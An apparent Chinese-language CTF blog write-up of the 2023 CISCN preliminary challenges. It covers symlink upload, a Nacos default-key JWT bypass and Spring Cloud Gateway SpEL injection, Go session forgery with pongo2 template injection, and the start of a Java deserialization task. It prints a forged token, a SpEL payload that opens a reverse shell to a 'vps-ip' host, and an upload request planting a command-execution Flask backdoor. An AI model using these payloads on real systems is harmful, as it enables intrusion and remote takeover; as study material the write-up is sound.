@@ -1,0 +1,389 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>2023CISCN初赛 | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="2023CISCN初赛Unzip题型：文件上传（软连接）
+
+点击上传，跳转到upload.php，高亮源码
+
+软连接
+
+依次上传 1.zip、2.zip"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="2023CISCN初赛"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 2023CISCN初赛</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="2023CISCN初赛"><a href="#2023CISCN初赛" class="headerlink" title="2023CISCN初赛"></a>2023CISCN初赛</h1><h2 id="Unzip"><a href="#Unzip" class="headerlink" title="Unzip"></a>Unzip</h2><p>题型：文件上传（软连接）</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326122623734.png" alt="image-20240326122623734"></p>
+<p>点击上传，跳转到upload.php，高亮源码</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326122625315.png" alt="image-20240326122625315"></p>
+<p>软连接</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326123325173.png" alt="image-20240326123325173"></p>
+<p>依次上传 1.zip、2.zip</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326123701286.png" alt="image-20240326123701286"></p>
+<h2 id="BackendService"><a href="#BackendService" class="headerlink" title="BackendService"></a>BackendService</h2><p>题型：nacos身份认证漏洞+Nacos结合Spring Cloud Gateway RCE利用</p>
+<h3 id="nacos身份认证漏洞"><a href="#nacos身份认证漏洞" class="headerlink" title="nacos身份认证漏洞"></a>nacos身份认证漏洞</h3><p>这里用的 QVD-2023-6271 nacos token.secret.key身份认证绕过漏洞</p>
+<p>影响版本：0.1.0&lt;&#x3D; Nacos&lt;&#x3D; 2.2.0</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326213857112.png" alt="image-20240326213857112"></p>
+<p>默认密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SecretKey012345678901234567890123456789012345678901234567890123456789</span><br></pre></td></tr></table></figure>
+
+<p>exp为时间戳，大于当前时间即可</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326214023826.png" alt="image-20240326214023826"></p>
+<p>发送到重放模块，添加Authorization: Bearer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MjU1NjAyODgwMH0.qortgrr-UfhqQ-G9AWstQO-azRecm_b84uonXmYDMqo</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326214430882.png" alt="image-20240326214430882"></p>
+<p>登入系统</p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326214455398.png" alt="image-20240326214455398"></p>
+<h3 id="Nacos结合Spring-Cloud-Gateway-RCE利用"><a href="#Nacos结合Spring-Cloud-Gateway-RCE利用" class="headerlink" title="Nacos结合Spring Cloud Gateway RCE利用"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a></h3><p>该漏洞在网上公开POC的利用方式是通过&#x2F;actuator&#x2F;gateway&#x2F;routes这个节点进行动态添加路由的，当项目配置文件中配置了以下两行配置时（YAML格式），便会开启该接口：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## application.yaml</span></span><br><span class="line"><span class="attr">management.endpoint.gateway.enabled:</span> <span class="literal">true</span> <span class="comment"># default value</span></span><br><span class="line"><span class="attr">management.endpoints.web.exposure.include:</span> <span class="string">gateway</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327132354140.png" alt="image-20240327132354140"></p>
+<p>题目中的backcfg服务节点（就是nacos服务本身，两者是同一个机器）加载配置文件的话就可以在控制台创建backcfg.json配置，之后backcfg服务节点就会自动导入配置。<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11493#toc-5">Nacos结合Spring Cloud Gateway RCE利用</a><code>配置文件gateway，如果发现应用未开启Actuator，则结合前文所说的利用响应包增加Header的方式回显，将配置在Nacos中进行修改</code></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327132550145.png" alt="image-20240327132550145"></p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">exam</span></span><br><span class="line">          <span class="attr">order:</span> <span class="number">0</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://service-provider</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/echo/**</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">AddResponseHeader</span></span><br><span class="line">              <span class="attr">args:</span></span><br><span class="line">                <span class="attr">name:</span> <span class="string">result</span></span><br><span class="line">                <span class="attr">value:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327135741495.png" alt="image-20240327135741495"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240326215608435.png" alt="image-20240326215608435"></p>
+<p>上面是yaml格式，不过很多博客讲要用json格式（json也可以）</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;spring&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cloud&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;gateway&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;exam&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;order&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://example.com/&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;predicates&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="string">&quot;Path=/echo/**&quot;</span></span><br><span class="line">                        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;filters&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                            <span class="punctuation">&#123;</span></span><br><span class="line">                                <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AddResponseHeader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                                    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;result&quot;</span><span class="punctuation">,</span></span><br><span class="line">                                    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&#123;new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;&#x27;bash&#x27;, &#x27;-c&#x27;, &#x27;bash -i &gt;&amp; /dev/tcp/vps-ip/6666 0&gt;&amp;1&#x27;&#125;).getInputStream())).replaceAll(&#x27;\n&#x27;,&#x27;&#x27;).replaceAll(&#x27;\r&#x27;,&#x27;&#x27;)&#125;&quot;</span></span><br><span class="line">                                <span class="punctuation">&#125;</span></span><br><span class="line">                            <span class="punctuation">&#125;</span></span><br><span class="line">                        <span class="punctuation">]</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="go-session"><a href="#go-session" class="headerlink" title="go_session"></a>go_session</h2><p>题型：go的session伪造+pongo2模板注入</p>
+<p>没有深入</p>
+<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">	r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">	r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">	r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>route.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">	<span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line">	<span class="string">&quot;html&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 判断是否携带了cookie，如果cookie中的name为空，就将其设置为guest</span></span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="literal">nil</span> &#123;</span><br><span class="line">		session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">		err = session.Save(c.Request, c.Writer)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 获取session中的name的值，若不为admin则后续无法进行，因此需要过的第一关是对session进行伪造，后续是pongo2的ssti</span></span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">	xssWaf := html.EscapeString(name)</span><br><span class="line">	tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;  <span class="comment">// 获取会话，然后判断name字段是否为空，不为空则获取url中name字段的值，并将其与本地地址拼接，发送一个GET请求</span></span><br><span class="line">	session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">	c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><p>伪造session</p>
+<p>修改<code>session.Values[&quot;name&quot;] = &quot;admin&quot;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go run main.go</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327192605632.png" alt="image-20240327192605632"></p>
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327200832964.png" alt="image-20240327200832964"></p>
+<p><strong>pongo2模板注入</strong></p>
+<p>&#x2F;flask?name&#x3D;&#x2F;，引发报错拿到flask源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&#x27;no ssti&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个程序设置了debug&#x3D;True，说明程序开启了热加载功能，代码在更改后会自动重新加载程序，这意味着我们对代码进行更改后就会立即生效，debug模式下的热加载替换flask源码实现RCE，要用到SaveUploadedFile方法实现任意文件写<code>&#123;&#123;c.SaveUploadedFile(c.FormFile("file"),"/app/server.py")&#125;&#125;</code></p>
+<blockquote>
+<p>但这里要注意参数经过 html.EscapeString(name) 转义，会将双引号转义掉，所以要换一种方式，对于”file”，gin.Context还提供了另一种方法，HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin&#x2F;route.Admin，然后可以用过滤器last获取最后一个字符串。对于 “&#x2F;app&#x2F;server.py”，可以在请求头中将Referer字段设置成 “&#x2F;app&#x2F;server.py”，然后用 Request.Referer()方法获取Referer的值。（还有其他方法，如Request.Host()、Request.UA()等）</p>
+<p>因为要从Referer头中获取源码路径，故添加Referer: &#x2F;app&#x2F;server.py，且上传文件提交表单需要Content-Type 请求，同时需要边界字符串分割（可自定义），故添加Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundary8ALIn5Z2C3VlBqND</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET /admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125; HTTP/1.1</span><br><span class="line">Host: 859997a4-b46a-4a5c-b034-448e90505aa5.challenge.ctf.show</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Referer: /app/server.py</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line">Cookie: session-name=MTcxMTUzODU2MXxEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXyB-2MEmWBEhT2LmkrXFrKm9hHzDFKVLoIWHcrKauUlWQ==</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 429</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8ALIn5Z2C3VlBqND</span><br><span class="line">Content-Disposition: form-data; name=&quot;n&quot;; filename=&quot;1.py&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">from flask import *</span><br><span class="line">import os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args[&#x27;name&#x27;]</span><br><span class="line">    file=os.popen(name).read()</span><br><span class="line">    return file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(host=&quot;0.0.0.0&quot;, port=5000, debug=True)</span><br><span class="line">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/image-20240327194437758.png" alt="image-20240327194437758"></p>
+<p>Fianl，&#x2F;flask?name&#x3D;?name&#x3D;env</p>
+<h2 id="deserbug"><a href="#deserbug" class="headerlink" title="deserbug"></a>deserbug</h2><p>题型：Java反序列化 C</p>
+<p>附件中可以看到两个依赖，分别是<code>common-colletions-3.2.2</code>和<code>hutool-all-5.8.18</code></p>
+<p><code>CC3.2.2</code>，比<code>CC3.1.1</code>多了一个<code>checkUnsafeSerialization</code>函数，对序列化的类进行了检查，禁止一些类的序列化：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure>
+
+<p>源码，MyExpect类，Testapp类</p>
+<p>MyExpect.java</p>
